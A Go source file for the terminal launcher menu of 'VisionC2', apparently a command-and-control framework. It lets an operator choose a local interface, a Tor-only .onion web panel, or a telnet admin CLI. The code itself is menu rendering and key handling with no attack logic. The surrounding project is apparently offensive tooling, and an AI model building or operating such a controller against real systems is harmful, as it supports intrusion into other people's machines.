package main

import (
	"fmt"
	"os"
	"strings"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

// LauncherChoices holds the selected modes from the launcher
type LauncherChoices struct {
	TUI    bool
	WebTor bool
	Split  bool
}

type launcherItem struct {
	label string
	desc  string
}

type launcherModel struct {
	items    []launcherItem
	selected [3]bool
	cursor   int
	done     bool
}

func newLauncherModel() launcherModel {
	return launcherModel{
		items: []launcherItem{
			{"TUI", "Local terminal interface (Bubble Tea)"},
			{"Web Panel (Tor)", "Hidden service .onion — no clearnet exposure"},
			{"Telnet (Split)", "Remote admin CLI on port " + USER_SERVER_PORT},
		},
		selected: [3]bool{false, true, false},
	}
}

func (m launcherModel) Init() tea.Cmd { return nil }

func (m launcherModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c", "q":
			return m, tea.Quit
		case "up", "k":
			if m.cursor > 0 {
				m.cursor--
			}
		case "down", "j":
			if m.cursor < len(m.items)-1 {
				m.cursor++
			}
		case " ":
			m.selected[m.cursor] = !m.selected[m.cursor]
		case "enter":
			m.done = true
			return m, tea.Quit
		}
	}
	return m, nil
}

func (m launcherModel) View() string {
	titleText := lipgloss.NewStyle().
		Foreground(lipgloss.Color("93")).
		Bold(true).
		Render("☾℣☽ VisionC2")

	boxStyle := lipgloss.NewStyle().
		Border(lipgloss.RoundedBorder()).
		BorderForeground(lipgloss.Color("93")).
		Padding(1, 2).
		MarginLeft(2)

	subtitleStyle := lipgloss.NewStyle().
		Foreground(lipgloss.Color("248")).
		Italic(true)

	checkedStyle := lipgloss.NewStyle().
		Foreground(lipgloss.Color("47")).
		Bold(true)

	uncheckedStyle := lipgloss.NewStyle().
		Foreground(lipgloss.Color("240"))

	cursorStyle := lipgloss.NewStyle().
		Foreground(lipgloss.Color("201")).
		Bold(true)

	descStyle := lipgloss.NewStyle().
		Foreground(lipgloss.Color("243")).
		Italic(true)

	hintStyle := lipgloss.NewStyle().
		Foreground(lipgloss.Color("240"))

	separatorStyle := lipgloss.NewStyle().
		Foreground(lipgloss.Color("236"))

	tagline := lipgloss.NewStyle().
		Foreground(lipgloss.Color("240")).
		Render("command & control")

	// Separator
	sep := separatorStyle.Render("    " + strings.Repeat("━", 50))

	// Build menu items
	var menuItems string
	for i, item := range m.items {
		cursor := "   "
		if m.cursor == i {
			cursor = cursorStyle.Render(" ▸ ")
		}

		check := uncheckedStyle.Render("○")
		if m.selected[i] {
			check = checkedStyle.Render("◉")
		}

		var label string
		if m.cursor == i {
			label = lipgloss.NewStyle().
				Foreground(lipgloss.Color("231")).
				Bold(true).
				Render(item.label)
		} else {
			label = lipgloss.NewStyle().
				Foreground(lipgloss.Color("252")).
				Render(item.label)
		}

		desc := descStyle.Render("  " + item.desc)

		menuItems += fmt.Sprintf("%s %s  %s\n", cursor, check, label)
		menuItems += fmt.Sprintf("        %s\n", desc)
		if i < len(m.items)-1 {
			menuItems += "\n"
		}
	}

	// Hints
	hints := hintStyle.Render("  ⎵ toggle") + "  " +
		hintStyle.Render("⏎ launch") + "  " +
		hintStyle.Render("q quit")

	// Compose inner content
	inner := "    " + titleText + "  " + tagline + "\n\n" +
		sep + "\n\n" +
		subtitleStyle.Render("    Select launch modes:") + "\n\n" +
		menuItems + "\n" +
		sep + "\n\n" +
		"    " + hints + "\n"

	return "\n" + boxStyle.Render(inner) + "\n"
}

// RunLauncher shows the mode selection TUI and returns the choices
func RunLauncher() LauncherChoices {
	m := newLauncherModel()
	p := tea.NewProgram(m)
	result, err := p.Run()
	if err != nil {
		fmt.Println("Launcher error:", err)
		os.Exit(1)
	}

	final := result.(launcherModel)
	if !final.done {
		os.Exit(0)
	}

	return LauncherChoices{
		TUI:    final.selected[0],
		WebTor: final.selected[1],
		Split:  final.selected[2],
	}
}
